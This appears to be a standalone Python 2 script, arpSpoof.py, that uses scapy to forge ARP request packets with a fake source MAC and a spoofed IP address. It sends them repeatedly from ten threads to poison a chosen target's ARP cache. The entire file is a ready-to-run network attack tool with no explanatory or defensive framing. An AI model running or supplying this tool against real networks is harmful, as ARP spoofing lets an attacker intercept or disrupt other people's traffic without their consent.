from scapy.all import *
import threading
import sys

SEND_TIMES=10
SEND_THREADS=10


def sendPacket(pkt):
    global SEND_TIMES
    for i in range(SEND_TIMES):
        sendp(pkt)

def main(argv):
    DST_IP=argv[0]
    DST_MAC=argv[1]
    MASK_IP=argv[2]
    FAKE_MAC=argv[3]
    pkt=Ether(src=FAKE_MAC,dst=DST_MAC)/ARP(hwsrc=FAKE_MAC,psrc=MASK_IP,hwdst=DST_MAC,pdst=DST_IP,op=1)
    for i in range(SEND_THREADS):
        sendThread=threading.Thread(target=sendPacket,args=(pkt,))
        sendThread.start()

if __name__ == '__main__':
    if len(sys.argv)!=5:
        print "usage:python arpSpoof.py <DST_IP> <DST_MAC> <MASK_IP> <FAKE_MAC>"
    else:
        main(sys.argv[1:])